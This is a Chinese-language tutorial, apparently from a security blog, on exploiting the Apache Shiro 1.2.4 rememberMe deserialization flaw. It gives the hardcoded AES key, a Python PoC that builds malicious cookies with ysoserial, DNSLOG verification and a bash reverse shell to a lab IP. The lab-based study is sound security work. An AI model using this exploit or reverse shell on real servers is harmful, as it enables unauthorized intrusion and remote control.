## 0×00 前言

最近在工作中遇到了这个漏洞，由于是第一次接触，在分析过程中又耗费了大量的时间…所以特意搭建漏洞环境深入学习一下，下面由一个案例引入该漏洞。

## 0×01 案例分析

近期，有同事在渗透测试时发现一服务器疑似被黑客入侵：

![image.png](https://image.3001.net/images/20200309/1583745501_5e6609ddcee97.png!small)

通过不断筛选、分析原始流量，最终定位到以下数据包：![image.png](https://image.3001.net/images/20200309/1583745518_5e6609eed108d.png!small)

通过rememberMe字段判断，攻击者应该是利用了shiro反序列化漏洞，但攻击ip是.141.59，与最初发现的攻击ip不符，于是继续进行解密获取了以下信息：![image.png](https://image.3001.net/images/20200309/1583745526_5e6609f6af853.png!small)

解到的ip与最初发现的攻击者ip相同，确定了攻击者是该.225.229机器，通过.141.59机器发送payload，将shell反弹到.225.229机器上。

解密要注意AES密钥是否对应。

从解密出的数据也可以看出是java反序列化利用常用的几个接口，确定攻击者通过shiro反序列化漏洞完成攻击。

## 0×02 漏洞原理

该漏洞的主要位置在cookie处，1.2.4版本Shiro
提供了记住我（RememberMe）的功能，比如在访问一些有登录页面的网站，关闭浏览器后，下次打开时还是能默认记住你是谁，下次无需登录即可访问。

该模块数据传输的主要流程是：读取cookie->base64解码->AES解密->反序列化，但是它使用了硬编码，存在一个预设秘钥：“kPH+bIxk5D2deZiIxcaaaA==”，因此我们就可以构造恶意payload，通过序列化->AES加密->base64编码，将生成的新的payload放在cookie字段传给服务器，以达到攻击服务器的目的。

## 0×03 环境搭建

鉴于源码搭建比较麻烦，此次通过docker来完成环境搭建。

    
    
    docker pullmedicean/vulapps:s_shiro_1
    docker run -d-p 80:8080 medicean/vulapps:s_shiro_1   

搭建完成后可以在本地浏览一下是否搭建成功，如图：![image.png](https://image.3001.net/images/20200309/1583745544_5e660a0833bcd.png!small)

## 0×04 漏洞验证

通常在遇到漏洞先验证漏洞是否存在，需要借助DNSLOG平台来完成。

dnslog平台利用了dns解析原理，通过构造一个域名，让目标机器进行解析、返回包，以达到我们验证目标机器成功执行命令的目的。

这里我使用了<http://ceye.io>，创建完成后会生成一个固定域名，以作备用：![image.png](https://image.3001.net/images/20200309/1583745555_5e660a13f2f90.png!small)

网上有很多相关漏洞的poc，在文章末会附上我使用的工具。

先安装python环境，在这个poc脚本涉及了两个第三方库需要自行安装：

    
    
    pip installrequests
    pip install -ihttps://pypi.douban.com/simplepycryptodome

安装完成后可以使用poc构造恶意payload：

    
    
    import sys
    
    import uuid
    
    import base64
    
    import subprocess
    
    from Crypto.Cipher import AES
    
    def encode_rememberme(command):
    
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-BETA-all.jar','JRMPClient', command], stdout=subprocess.PIPE)      //这里使用了ysoserial工具包，它**了各种java反序列化payload，主要有CommonsCollections1-5、JRMPClient等模块
    
    BS = AES.block_size
    
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) %BS)).encode()
    
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    
    iv = uuid.uuid4().bytes
    
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    
    file_body = pad(popen.stdout.read())
    
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    
    return base64_ciphertext
    
    if __name__ == '__main__':
    
    payload = encode_rememberme(sys.argv[1]) 
    
    print"rememberMe={0}".format(payload.decode())

  

此处我们使用JRMPClient模块来构造：![image.png](https://image.3001.net/images/20200309/1583745651_5e660a73aa664.png!small)

如果使用curl命令测试，可以使用CommonsCollections1模块来构造，但ping命令测试不成功，在这一块卡了很久…![image.png](https://image.3001.net/images/20200309/1583745668_5e660a8470d1e.png!small)

接下来从目标网站上抓包，通常post、get方式都可以，视情况而定。然后将得到的remember字段贴到cookie上发送：![image.png](https://image.3001.net/images/20200309/1583745675_5e660a8b39b04.png!small)

查看ceye平台，已收到回包，证明漏洞存在：![image.png](https://image.3001.net/images/20200309/1583745682_5e660a922963a.png!small)

## 0×05 漏洞利用

已经明白了漏洞原理，我们就可以构造反弹shell，来控制目标服务器。

攻击机器ip：192.168.99.174

目标机器ip：192.168.99.202

    
    
    bash -i>& /dev/tcp/192.168.99.174/2333 0>&1

因为java环境不支持管道符、输入输出重定向等，因此我们需要提前通过Java Runtime配合 bash 进行编码。

<http://www.jackson-t.ca/runtime-exec-payloads.html>![image.png](https://image.3001.net/images/20200309/1583745699_5e660aa3dd17b.png!small)

在攻击机器监听2333端口：![image.png](https://image.3001.net/images/20200309/1583745708_5e660aac05b6f.png!small)

将反弹shell处理后发送到目标机器，这里需要使用CommonsCollections2模块：![image.png](https://image.3001.net/images/20200309/1583745714_5e660ab2db604.png!small)![image.png](https://image.3001.net/images/20200309/1583745720_5e660ab8db6d6.png!small)

查看攻击机器，已经获取到shell：![image.png](https://image.3001.net/images/20200309/1583745727_5e660abf6abb7.png!small)

## 0×06 工具

链接：https://pan.baidu.com/s/1nCdPc0RarG9YZIVb_a-E9w

提取码：hn6o

